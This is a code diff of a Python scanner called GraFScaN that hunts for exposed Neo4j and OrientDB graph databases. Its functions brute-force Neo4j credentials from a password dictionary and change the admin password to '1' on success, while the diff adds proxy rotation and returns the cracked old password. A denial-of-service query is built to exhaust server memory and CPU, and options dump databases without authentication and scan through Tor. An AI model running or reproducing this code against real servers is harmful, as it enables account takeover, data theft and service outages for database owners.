@@ -19,7 +19,7 @@ def banner():
 	|       GraFScaN       |
 	------------------------
 
-     A analysis graph database tool
+     An analysis graph database tool
     """)
 def dos_RamCpu(ip,url_query,headers):
     requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers).json()
@@ -38,12 +38,17 @@ def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	g["statements"] = l
 	requests.post(url_query,json=g,headers=headers)
 
-def brutteForce_Neo4j(ip,dictpassw,headers):
-
-    url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
-    data = '{"password":"1"}';
-    for passw in dictpassw:
-		requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=0.1)
+def brutteForce_Neo4j(ip,dictpassw,proxies,headers):
+	d = {}
+	url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
+	data = '{"password":"1"}';
+	for i,passw in enumerate(dictpassw):
+		proxies = {
+  			'http': 'http://'+proxies[i%len(proxies)],
+		}
+		r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=0.1)
+		if (r_pass.status_code == 200):
+			return passw
 
 def brutteForce_Orient(ip,dictpassw):
 
@@ -60,7 +65,7 @@ def analyzeIP_Orient(ip,args):
 		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
 		if (r.status_code == 200):
 			json_response = r.json()
-			''' We need to know the password of root'''			
+			''' Para saber info del server es necesario romper la pass de root'''			
 			if args.bruteForce == True:
 				p,infoServer = brutteForce_Orient(ip,args.dict)
             			data_report['server_pass'] = p
@@ -152,23 +157,24 @@ def analyzeIP_Neo4j(ip,args):
 			json_response = r.json()
 			if (json_response.keys()[0] == "errors"):
 				data_report["autenticacion"] = True
-				url_webadmin = "http://" + ip + ":7474/webadmin";
-				headers = {
-					'content-type': "application/json",
-						'accept': "application/json",
-						}
-				r = requests.get(url_webadmin,headers=headers,timeout=1)
-				if (r.status_code == 404):
-						data_report["version"]= "> 3.X"
-				elif (r.status_code == 200 or r.status_code == 401):
-				data_report["version"] = "< 3.X"
-				data_report["ip"] = ip
-				if args.bruteForce == True:
-					brutteForce_Neo4j(ip,args.dict,headers)
-					r = requests.get(url,auth=('neo4j', '1'),timeout=1 )
+	        		url_webadmin = "http://" + ip + ":7474/webadmin";
+	        		headers = {
+				     	'content-type': "application/json",
+		             		'accept': "application/json",
+	               			}
+	        		r = requests.get(url_webadmin,headers=headers,timeout=1)
+	        		if (r.status_code == 404 or r.status_code == 401):
+	            			data_report["version"]= "> 3.X"
+	        		elif (r.status_code == 200):
+					data_report["version"] = "< 3.X"
+					data_report["ip"] = ip
+	        		if args.bruteForce == True:
+					passwd_old = brutteForce_Neo4j(ip,args.dict,args.proxies,headers)
+					r = requests.get(url,auth=('neo4j', '1'),timeout=1)
 					if (r.status_code == 200):
 						data_report["change_password"] = "yes"
-					else:
+						data_report["old_passwd"]= passwd_old
+			    		else:
 						data_report["change_password"] = "no"
 				return data_report
 			else:
@@ -177,29 +183,34 @@ def analyzeIP_Neo4j(ip,args):
 			print "The ip: " + ip + " is not a Neo4j graph database."
 
 	except Exception as e:
-		print "Error: " + str(e) 
+		print "Error" 
 
 
 def getArguments(args):
-
 	listIps=list()
-	listPassw=list()
+    	listPassw=list()
+	listProxies=list()
 	arguments={}
 	parser = argparse.ArgumentParser(description='SecGD analyse the input to search Neo4j graph database.')
-	parser.add_argument("-o", dest='output', help="Output file", default="report.txt")
-	parser.add_argument('-B','--bruteforce', dest='bruteForce',action='store_true', help='Option to use brute force with authentication Neo4j.')
-	parser.add_argument("-dict", dest='dict', help="Dictionary file, one password per line", default="dict.txt")
-	parser.add_argument('-ip', dest='ip', help='Input one ip to analyse.')
-	parser.add_argument('-n','--network', dest='net', help='Input one network to analyse.')
-	parser.add_argument('-i', dest='fileinput', help='Input one file with one ip each line to analyse.')
-	parser.add_argument('-nl', '--no-limit', dest='limit', action='store_true',help='Option to dump all database of Neo4j without auth.')
-	parser.add_argument('-tor', dest='tor', action='store_true',help='Option to use proxy TOR to scan de input data, need install and run before executed.')
 	parser.add_argument('-neo4j', dest='neo4j', action='store_true', help='Discover and analyze Neo4j Graph database')
 	parser.add_argument('-orient', dest='orient', action='store_true', help='Discover and analyze Orient Graph Database')
 
+	parser.add_argument('-ip', dest='ip', help='Input one ip to analyse.')
+	parser.add_argument('-n','--network', dest='net', help='Input one network to analyse.')
+	parser.add_argument('-i', dest='fileinput', help='Input one file with one ip each line to analyse.')
+	parser.add_argument("-o", dest='output', help="Output file", default="report.txt")
+
+	parser.add_argument('-B','--bruteforce', dest='bruteForce',action='store_true', help='Option to use brute force with authentication Neo4j.')
+    	parser.add_argument("-dict", dest='dict', help="Dictionary file, one password per line", default="dict.txt")
+	parser.add_argument("-proxies", dest='proxies', help="Proxies file, format: <ip>:<port>", default="proxies.txt")
+	parser.add_argument('-nl', '--no-limit', dest='limit', action='store_true',help='Option to dump all database of Neo4j without auth.')
+	parser.add_argument('-tor', dest='tor', action='store_true',help='Option to use proxy TOR to scan de input data, need install and run before executed.')
+	parser.add_argument('-DoS', dest='DoS',action='store_true', help='Option to use DoS without authentication Neo4j.')
+	
+
 	args = parser.parse_args()
 
-	if not args.ip and not args.fileinput and not args.net:
+    	if not args.ip and not args.fileinput and not args.net:
 		print "Need one type of input, -i -ip or -n/--network"
 		print parser.print_help()
 		sys.exit(-1)
@@ -236,6 +247,15 @@ def getArguments(args):
 			    print "Wrong dict file.\n\n"
 			    print parser.print_help()
 			    sys.exit(-1)
+			if args.neo4j:
+				try:
+					f = open(args.proxies, 'r')
+			    		for line in f:
+						listProxies.append(line.strip())
+				except Exception as e:
+			    		print "Wrong proxies file.\n\n"
+			    		print parser.print_help()
+			    		sys.exit(-1)
 	args.listIps = listIps
 	return args
 
